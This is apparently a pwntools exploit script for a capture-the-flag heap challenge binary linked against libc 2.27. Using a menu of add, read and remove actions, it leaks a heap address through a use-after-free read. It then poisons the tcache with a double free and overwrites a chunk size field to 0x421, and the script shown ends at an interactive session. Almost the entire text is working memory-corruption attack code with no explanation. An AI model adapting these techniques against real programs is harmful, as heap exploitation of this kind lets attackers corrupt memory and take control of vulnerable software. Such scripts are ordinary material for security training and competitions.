from pwn import *

elf = ELF('./chall')
libc = ELF('./libc-2.27.so')

# Using the provided loader and libc
io = process(['./ld-2.27.so', './chall'], env={"LD_PRELOAD": "./libc-2.27.so"})

def add(idx, title, page):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'?: ', str(idx).encode())
    io.sendlineafter(b'Title: ', title)
    io.sendlineafter(b'Page: ', str(page).encode())

def read(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'?: ', str(idx).encode())
    io.recvuntil(b'Title: ')
    title = io.recvuntil(b'\nPage:', drop=True)
    return title

def remove(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'?: ', str(idx).encode())

gdb.attach(io, gdbscript='''
break free
continue
''')

# STEP 1: Allocate chunks
for i in range(20):
    add(i, f'T{i}'.encode(), i)

# STEP 2: Heap leak
remove(0)
remove(1)
heap_leak = u64(read(1).ljust(8, b'\x00'))
log.success(f"Heap leak: {hex(heap_leak)}")

# STEP 3: Tcache poisoning
for i in range(2, 9):
    remove(i)

remove(9)
remove(10)
remove(9)

for i in range(2, 9):
    add(i, b'filler', i)

target = heap_leak + 0x170
log.info(f"Targeting: {hex(target)}")

add(9, p64(target), 9)
add(10, b'dummy', 10)
add(11, b'dummy', 11)

# Overwrite size
add(12, p64(0) + p64(0x421), 12)

# Free 12
remove(12)

io.interactive()
